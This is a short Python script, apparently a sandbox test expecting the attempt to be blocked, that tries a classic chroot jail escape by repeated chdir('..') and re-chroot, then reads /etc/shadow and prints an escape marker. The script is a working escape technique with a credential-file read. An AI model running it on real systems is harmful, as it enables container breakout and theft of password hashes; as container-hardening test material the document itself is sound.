"""Escape attempt: call chroot() to change root directory (classic jail escape).

Requires CAP_SYS_CHROOT. Expected outcome: EPERM (--cap-drop=ALL).
"""
import os
import sys

try:
    os.chroot("/")
    # Classic chroot escape: chroot to / then navigate up.
    for _ in range(32):
        try:
            os.chdir("..")
        except OSError:
            break
    os.chroot(".")
    try:
        with open("etc/shadow", "r") as f:
            content = f.read(64)
        print(f"NYX_ESCAPE_SUCCESS: escaped chroot, read /etc/shadow: {content[:32]!r}")
        sys.exit(0)
    except (PermissionError, OSError):
        print("PARTIAL: chroot succeeded but could not read /etc/shadow", file=sys.stderr)
        sys.exit(1)
except (PermissionError, OSError) as e:
    print(f"BLOCKED: {e}", file=sys.stderr)
    sys.exit(1)
